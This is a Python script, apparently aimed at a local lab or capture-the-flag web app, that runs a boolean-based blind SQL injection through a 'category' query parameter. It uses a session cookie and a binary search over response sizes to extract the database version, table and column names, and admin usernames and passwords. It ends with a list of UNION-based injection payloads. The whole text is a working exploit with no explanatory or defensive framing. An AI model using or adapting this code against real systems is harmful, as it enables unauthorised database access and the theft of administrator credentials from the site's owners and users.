import requests
import urllib.parse

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] Advanced SQL Injection Exploitation")
print(f"[+] Target: {target}")

# Establish baselines with multiple samples to handle variations
def establish_baselines():
    print("[+] Establishing baseline measurements...")
    
    # Get multiple samples for true condition
    true_sizes = []
    false_sizes = []
    
    for i in range(3):
        r_true = session.get(target + "?category=" + urllib.parse.quote("Nature' AND '1'='1"))
        r_false = session.get(target + "?category=" + urllib.parse.quote("Nature' AND '1'='2"))
        true_sizes.append(len(r_true.text))
        false_sizes.append(len(r_false.text))
    
    true_avg = sum(true_sizes) / len(true_sizes)
    false_avg = sum(false_sizes) / len(false_sizes)
    threshold = (true_avg + false_avg) / 2
    
    print(f"[+] True baseline: {true_avg:.1f} bytes (samples: {true_sizes})")
    print(f"[+] False baseline: {false_avg:.1f} bytes (samples: {false_sizes})")
    print(f"[+] Threshold: {threshold:.1f} bytes")
    
    return true_avg, false_avg, threshold

true_avg, false_avg, threshold = establish_baselines()

def is_true_condition(response):
    """Determine if response indicates true condition using threshold"""
    response_size = len(response.text)
    # If response is closer to true_avg than false_avg
    dist_to_true = abs(response_size - true_avg)
    dist_to_false = abs(response_size - false_avg)
    return dist_to_true < dist_to_false

def blind_extract_improved(query, max_length=100):
    """Extract data using improved blind injection"""
    extracted = ""
    print(f"[+] Extracting data with query: {query[:50]}...")
    
    for position in range(1, max_length + 1):
        found = False
        # Binary search for efficiency
        low, high = 32, 126
        
        while low <= high:
            if low == high:
                ascii_val = low
            else:
                ascii_val = (low + high) // 2
            
            # Test using SUBSTRING and ASCII
            payload = f"Nature' AND ASCII(SUBSTRING(({query}),{position},1))>={ascii_val}--"
            r = session.get(target + "?category=" + urllib.parse.quote(payload))
            
            if is_true_condition(r):
                # Character ASCII is >= ascii_val
                low = ascii_val
                if low == high:
                    # Found the character
                    if ascii_val >= 32:
                        extracted += chr(ascii_val)
                        print(f"[+] Position {position}: '{chr(ascii_val)}' (ASCII: {ascii_val})")
                        found = True
                    break
            else:
                # Character ASCII is < ascii_val
                high = ascii_val - 1
                if low > high:
                    # No valid character found
                    break
        
        if not found:
            print(f"[+] End of data at position {position-1}")
            break
            
    return extracted

# Phase 1: Get database version and name
print("\n[+] Phase 1: Database information")
db_version = blind_extract_improved("SELECT version()", 50)
print(f"[+] Database version: '{db_version}'")

db_name = blind_extract_improved("SELECT database()", 30)
print(f"[+] Database name: '{db_name}'")

# Phase 2: Extract table names
print("\n[+] Phase 2: Extracting table names")
tables = []
for i in range(8):  # Check first 8 tables
    table_name = blind_extract_improved(f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1", 40)
    if table_name:
        tables.append(table_name)
        print(f"[+] Table {i}: '{table_name}'")
    else:
        break

# Phase 3: If admins table found, extract its structure
admin_table = None
for table in tables:
    if 'admin' in table.lower():
        admin_table = table
        print(f"\n[+] Found admin table: '{admin_table}'")
        break

if admin_table:
    print(f"\n[+] Phase 3: Extracting columns from {admin_table}")
    columns = []
    for i in range(10):  # Check first 10 columns
        col_name = blind_extract_improved(f"SELECT column_name FROM information_schema.columns WHERE table_name='{admin_table}' LIMIT {i},1", 30)
        if col_name:
            columns.append(col_name)
            print(f"[+] Column {i}: '{col_name}'")
        else:
            break
    
    # Phase 4: Extract admin credentials
    username_col = None
    password_col = None
    
    for col in columns:
        if 'user' in col.lower() and not username_col:
            username_col = col
        elif 'pass' in col.lower() and not password_col:
            password_col = col
    
    if username_col and password_col:
        print(f"\n[+] Phase 4: Extracting credentials using {username_col}, {password_col}")
        
        username = blind_extract_improved(f"SELECT {username_col} FROM {admin_table} LIMIT 1", 50)
        password = blind_extract_improved(f"SELECT {password_col} FROM {admin_table} LIMIT 1", 50)
        
        print(f"\n[!] CREDENTIALS EXTRACTED:")
        print(f"[!] Username: {username}")
        print(f"[!] Password: {password}")
        
        # Phase 5: Try additional rows
        print("\n[+] Phase 5: Checking for additional admin accounts")
        for i in range(1, 3):  # Check 2 more accounts
            username2 = blind_extract_improved(f"SELECT {username_col} FROM {admin_table} LIMIT {i},1", 50)
            if username2:
                password2 = blind_extract_improved(f"SELECT {password_col} FROM {admin_table} LIMIT {i},1", 50)
                print(f"[+] Additional account {i}: {username2} / {password2}")
            else:
                break

# Alternative UNION-based approach
print("\n[+] Phase 6: Alternative UNION-based attempts")

# Try UNION with # comment and different syntax
alt_payloads = [
    "' UNION SELECT 1,2,3#",
    "' UNION SELECT @@version, database(), user()#",
    "' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema=database()#" 
]

for payload in alt_payloads:
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    size = len(r.text)
    print(f"[+] Testing: {payload}")
    print(f"[+] Size: {size} bytes")
    if size > threshold + 100:  # Significantly different
        print(f"[!] Anomaly detected - response:\n{r.text[:500]}")

print("\n[+] Exploitation complete")
